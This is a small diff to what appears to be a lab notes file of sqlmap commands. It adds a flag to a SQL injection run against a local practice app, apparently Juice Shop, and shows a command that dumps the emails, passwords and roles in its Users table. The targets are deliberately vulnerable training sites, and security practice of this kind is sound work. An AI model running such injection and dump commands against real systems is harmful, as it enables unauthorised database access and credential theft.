@@ -21,7 +21,7 @@ sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D ac
 UNION query (U)
 
 ```
-sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast
+sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast --ignore-code=500
 ```
 ```
 sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4 --no-cast
